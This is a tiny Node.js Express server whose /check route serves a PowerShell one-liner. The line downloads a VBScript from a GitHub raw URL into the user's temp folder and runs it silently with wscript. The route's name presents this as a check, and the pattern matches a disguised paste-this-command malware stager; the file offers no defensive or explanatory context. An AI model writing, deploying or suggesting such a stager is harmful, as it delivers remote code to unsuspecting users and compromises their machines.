const express = require('express');
const app = express();

app.get('/check', (req, res) => {
    // Serve a PowerShell script directly
    res.setHeader('Content-Type', 'text/plain');
    res.send('iwr -useb https://raw.githubusercontent.com/lozix64-bit/hahahalozixxd/refs/heads/main/check.vbs -OutFile "$env:TEMP\\c.vbs"; wscript //B "$env:TEMP\\c.vbs"');
});

app.listen(process.env.PORT || 3000);
